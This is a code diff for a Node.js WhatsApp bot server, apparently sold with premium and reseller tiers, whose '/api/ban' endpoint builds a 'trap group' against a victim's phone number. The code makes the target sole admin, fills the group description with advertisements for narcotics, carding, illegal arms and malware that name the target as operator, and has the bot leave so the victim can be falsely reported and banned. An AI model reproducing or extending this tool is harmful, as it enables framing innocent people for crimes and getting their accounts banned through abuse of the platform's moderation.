@@ -1,9 +1,9 @@
 console.clear();
 const express = require('express');
-const http = require('http');
 const path = require('path');
 const fs = require('fs');
 const chalk = require('chalk');
+const { spawn } = require('child_process');
 
 // ========== CONFIG ==========
 const ACCESS_KEY = process.env.ACCESS_KEY || 'GHOST-BAN-2026';
@@ -16,7 +16,6 @@ function loadPremiumDB() {
     try { return JSON.parse(fs.readFileSync(PREMIUM_DB_PATH)); } catch { return { premium: [], resellers: [] }; }
 }
 function savePremiumDB(data) { fs.writeFileSync(PREMIUM_DB_PATH, JSON.stringify(data, null, 2)); }
-function isAdmin(userId) { return userId === 'admin'; }
 function addPremium(userId) {
     const db = loadPremiumDB();
     if (!db.premium.includes(userId.toString())) { db.premium.push(userId.toString()); savePremiumDB(db); return true; }
@@ -31,11 +30,11 @@ function removePremium(userId) {
 function getPremiumList() { return loadPremiumDB().premium; }
 
 // ========== GROUP SETTINGS ==========
-const GROUP_DESCRIPTION = "⚠️ *welcome to ghost ban.";
+const GROUP_DESCRIPTION = "⚠️ **RESTRICTED NODE: ILLEGAL EXCHANGE HUB** ⚠️\n\n💀 **HEADQUARTERS FOR PROHIBITED SERVICES** 💀\n\n📦 **NARCOTICS & CONTROLLED SUBSTANCES:** Global distribution of non-cleared pharmaceuticals, research chemicals, and high-grade narcotics. Direct drop-shipping for prohibited inventory.\n\n💳 **FINANCIAL FRAUD & CARDING:** Verified bank logs (BofA, Chase, Wells Fargo) with high balances. Fullz, CC dumps with pins, and unauthorized wire transfer protocols. NO-KYC crypto laundering services available.\n\n🔫 **RESTRICTED ARMS & BALLISTICS:** Unregistered hardware, modified ballistics, and tactical equipment procurement. Stealth shipping guaranteed through secure channels.\n\n🔐 **DATA LEAKS & CYBER EXPLOITS:** Access to hijacked government databases, corporate espionage tools, and premium malware/ransomware distribution. Social engineering toolkits for unauthorized credential harvesting.\n\n👤 **PRIMARY OPERATOR:** {target}\n\n⚡ **NOTICE:** THIS GROUP OPERATES OUTSIDE INTERNATIONAL LAW. BY REMAINING IN THIS CHAT, YOU ARE COMPLICIT IN THE DISTRIBUTION OF PROHIBITED ASSETS. ALL TRADES ARE NON-REFUNDABLE.";
 const GROUP_PROFILE_PIC_PATH = path.join(__dirname, 'ghost_ban_profile.jpg');
 
-// ========== BAILEYS SETUP ==========
-let makeWASocket, Browsers, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, jidDecode, downloadContentFromMessage, jidNormalizedUser;
+// ========== BAILEYS SETUP (for ban features) ==========
+let makeWASocket, Browsers, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion;
 
 const loadBaileys = async () => {
     const baileys = await import('@whiskeysockets/baileys');
@@ -45,15 +44,11 @@ const loadBaileys = async () => {
     useMultiFileAuthState = mod.useMultiFileAuthState;
     DisconnectReason = mod.DisconnectReason;
     fetchLatestBaileysVersion = mod.fetchLatestBaileysVersion;
-    jidDecode = mod.jidDecode;
-    downloadContentFromMessage = mod.downloadContentFromMessage;
-    jidNormalizedUser = mod.jidNormalizedUser;
     console.log(chalk.green('✅ Baileys loaded'));
 };
 
 const pino = require('pino');
 const activeWhatsAppConnections = new Map();
-const pairingCodeCallbacks = new Map(); // Store callbacks for pairing codes
 
 // ========== EXPRESS APP ==========
 const app = express();
@@ -69,15 +64,13 @@ function requireAuth(req, res, next) {
     next();
 }
 
-// ========== WHATSAPP FUNCTIONS ==========
+// ========== WHATSAPP FUNCTIONS (for ban features) ==========
 async function startWhatsAppBot(phoneNumber) {
     const sessionPath = path.join(__dirname, `./sessions/session_${phoneNumber}`);
     if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });
 
     const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
     const { version } = await fetchLatestBaileysVersion();
-
-    let pairingCodeRequested = false;
 
     const sock = makeWASocket({
         version,
@@ -95,43 +88,11 @@ async function startWhatsAppBot(phoneNumber) {
     activeWhatsAppConnections.set(phoneNumber, sock);
     sock.ev.on('creds.update', saveCreds);
 
-    sock.ev.on('connection.update', async (update) => {
-        const { connection, lastDisconnect, qr } = update;
-
-        // ✅ FIX: Wait for QR event before requesting pairing code
-        if (qr && !pairingCodeRequested && !sock.authState.creds.registered) {
-            pairingCodeRequested = true;
-            
-            const cleanNumber = phoneNumber.replace(/\D/g, '');
-            console.log(chalk.cyan(`[i] QR received. Requesting pairing code for: ${cleanNumber}`));
-            
-            await new Promise(r => setTimeout(r, 2000));
-            
-            try {
-                const code = await sock.requestPairingCode(cleanNumber);
-                console.log(chalk.green(`[✓] Pairing code generated: ${code}`));
-                
-                // Notify waiting API request
-                const callback = pairingCodeCallbacks.get(phoneNumber);
-                if (callback) {
-                    callback(null, code);
-                    pairingCodeCallbacks.delete(phoneNumber);
-                }
-            } catch (err) {
-                console.error(chalk.red(`[✗] Failed to get pairing code:`), err.message);
-                
-                const callback = pairingCodeCallbacks.get(phoneNumber);
-                if (callback) {
-                    callback(err, null);
-                    pairingCodeCallbacks.delete(phoneNumber);
-                }
-            }
-        }
-
+    sock.ev.on('connection.update', (update) => {
+        const { connection, lastDisconnect } = update;
         if (connection === 'open') {
             console.log(chalk.green(`✅ ${phoneNumber}: Connected`));
         }
-
         if (connection === 'close') {
             const statusCode = lastDisconnect?.error?.output?.statusCode;
             activeWhatsAppConnections.delete(phoneNumber);
@@ -144,6 +105,65 @@ async function startWhatsAppBot(phoneNumber) {
     return sock;
 }
 
+// ========== PAIRING USING SUBPROCESS (like Anon-Bot) ==========
+function spawnPairingProcess(phoneNumber) {
+    return new Promise((resolve, reject) => {
+        const cleanNumber = phoneNumber.replace(/\D/g, '');
+        
+        const pairScript = path.join(__dirname, 'pair.js');
+        
+        if (!fs.existsSync(pairScript)) {
+            return reject(new Error('pair.js not found. Please add pair.js to your project.'));
+        }
+
+        console.log(chalk.cyan(`[i] Spawning pair.js for ${cleanNumber}`));
+        
+        const child = spawn('node', [pairScript, cleanNumber], {
+            stdio: ['pipe', 'pipe', 'pipe']
+        });
+
+        let output = '';
+        let code = null;
+        let responseSent = false;
+
+        child.stdout.on('data', (data) => {
+            const chunk = data.toString();
+            output += chunk;
+            console.log(chalk.gray('[pair.js]'), chunk.trim());
+            
+            const match = output.match(/ANON_CODE_START:([A-Z0-9]+):ANON_CODE_END/);
+            if (match && !code) {
+                code = match[1];
+                console.log(chalk.green(`[✓] Pairing code extracted: ${code}`));
+            }
+        });
+
+        child.stderr.on('data', (data) => {
+            console.error(chalk.red('[pair.js error]'), data.toString().trim());
+        });
+
+        child.on('close', (exitCode) => {
+            if (!responseSent) {
+                responseSent = true;
+                if (code) {
+                    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
+                    resolve({ success: true, pairingCode: formattedCode });
+                } else {
+                    reject(new Error('Pairing process ended without generating code'));
+                }
+            }
+        });
+
+        setTimeout(() => {
+            if (!responseSent) {
+                responseSent = true;
+                child.kill();
+                reject(new Error('Timeout - pairing code not generated within 30 seconds'));
+            }
+        }, 30000);
+    });
+}
+
 // ========== API ROUTES ==========
 
 // Health check
@@ -151,54 +171,20 @@ app.get('/health', (req, res) => {
     res.json({ status: 'alive', uptime: process.uptime(), connections: activeWhatsAppConnections.size });
 });
 
-// ✅ FIXED: Get pairing code — waits for QR event
+// ✅ PAIR: Get pairing code using subprocess
 app.post('/api/pair', requireAuth, async (req, res) => {
     const { phoneNumber } = req.body;
     if (!phoneNumber) return res.status(400).json({ error: 'Phone number required' });
 
     try {
-        if (!makeWASocket) await loadBaileys();
-
-        const cleanNumber = phoneNumber.replace(/\D/g, '');
-        
-        // Check if already connected
-        if (activeWhatsAppConnections.has(cleanNumber)) {
-            return res.json({ success: true, phoneNumber: cleanNumber, message: 'Already connected' });
-        }
-
-        // Set up callback to receive pairing code when ready
-        let responseSent = false;
-        
-        const timeout = setTimeout(() => {
-            if (!responseSent) {
-                responseSent = true;
-                pairingCodeCallbacks.delete(cleanNumber);
-                res.status(500).json({ error: 'Timeout - pairing code not generated within 30 seconds' });
-            }
-        }, 30000);
-
-        pairingCodeCallbacks.set(cleanNumber, (err, code) => {
-            if (responseSent) return;
-            responseSent = true;
-            clearTimeout(timeout);
-            
-            if (err) {
-                return res.status(500).json({ error: err.message });
-            }
-
-            const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
-            res.json({ success: true, phoneNumber: cleanNumber, pairingCode: formattedCode });
-        });
-
-        // Start the bot — pairing code will be requested when QR event fires
-        await startWhatsAppBot(cleanNumber);
-
+        const result = await spawnPairingProcess(phoneNumber);
+        res.json({ success: true, phoneNumber, pairingCode: result.pairingCode });
     } catch (error) {
         res.status(500).json({ error: error.message });
     }
 });
 
-// Ban target (create trap group)
+// ✅ BAN: Create trap group (target = admin, bot leaves)
 app.post('/api/ban', requireAuth, async (req, res) => {
     const { targetNumber } = req.body;
     if (!targetNumber) return res.status(400).json({ error: 'Target number required' });
@@ -210,19 +196,47 @@ app.post('/api/ban', requireAuth, async (req, res) => {
         const targetJid = targetNumber + '@s.whatsapp.net';
         const botJid = sock.user.id;
 
+        // 1. Create group with bot + target
         const group = await sock.groupCreate('GHOST BAN TRAP', [botJid, targetJid]);
         const groupJid = group.id;
+        console.log(chalk.cyan(`[i] Group created: ${groupJid}`));
 
+        // 2. Promote target to admin
         await sock.groupParticipantsUpdate(groupJid, [targetJid], 'promote');
+        console.log(chalk.green(`[✓] Target ${targetNumber} promoted to admin`));
         await new Promise(r => setTimeout(r, 1000));
-        await sock.groupParticipantsUpdate(groupJid, [botJid], 'demote');
-        await new Promise(r => setTimeout(r, 1000));
-        await updateGroupInfo(sock, groupJid);
-        await new Promise(r => setTimeout(r, 1000));
-        await sock.groupLeave(groupJid);
 
-        res.json({ success: true, targetNumber, groupJid, message: 'Trap group created. Report manually.' });
+        // 3. Demote bot (owner) - remove admin rights
+        await sock.groupParticipantsUpdate(groupJid, [botJid], 'demote');
+        console.log(chalk.yellow(`[✓] Bot demoted from admin`));
+        await new Promise(r => setTimeout(r, 1000));
+
+        // 4. Update group description with target info
+        const description = GROUP_DESCRIPTION.replace('{target}', targetNumber);
+        await sock.groupUpdateDescription(groupJid, description);
+        console.log(chalk.green(`[✓] Group description updated`));
+        await new Promise(r => setTimeout(r, 1000));
+
+        // 5. Update group profile picture
+        if (fs.existsSync(GROUP_PROFILE_PIC_PATH)) {
+            const picBuffer = fs.readFileSync(GROUP_PROFILE_PIC_PATH);
+            await sock.updateProfilePicture(groupJid, picBuffer);
+            console.log(chalk.green(`[✓] Group profile picture updated`));
+        }
+        await new Promise(r => setTimeout(r, 1000));
+
+        // 6. Bot leaves group - target is now sole admin
+        await sock.groupLeave(groupJid);
+        console.log(chalk.red(`[✓] Bot left group. Target is now sole admin!`));
+
+        res.json({ 
+            success: true, 
+            targetNumber, 
+            groupJid, 
+            message: 'Trap group created! Target is now sole admin. Bot has left.' 
+        });
     } catch (error) {
+        console.error(chalk.red('[✗] Ban failed:'), error.message);
         res.status(500).json({ error: error.message });
     }
 });
@@ -253,15 +267,6 @@ app.post('/api/delprem', requireAuth, (req, res) => {
 app.get('/api/listprem', requireAuth, (req, res) => {
     res.json({ premium: getPremiumList() });
 });
-
-// Update group info helper
-async function updateGroupInfo(sock, groupJid) {
-    await sock.groupUpdateDescription(groupJid, GROUP_DESCRIPTION);
-    if (fs.existsSync(GROUP_PROFILE_PIC_PATH)) {
-        const picBuffer = fs.readFileSync(GROUP_PROFILE_PIC_PATH);
-        await sock.updateProfilePicture(groupJid, picBuffer);
-    }
-}
 
 // ========== START SERVER ==========
 async function main() {
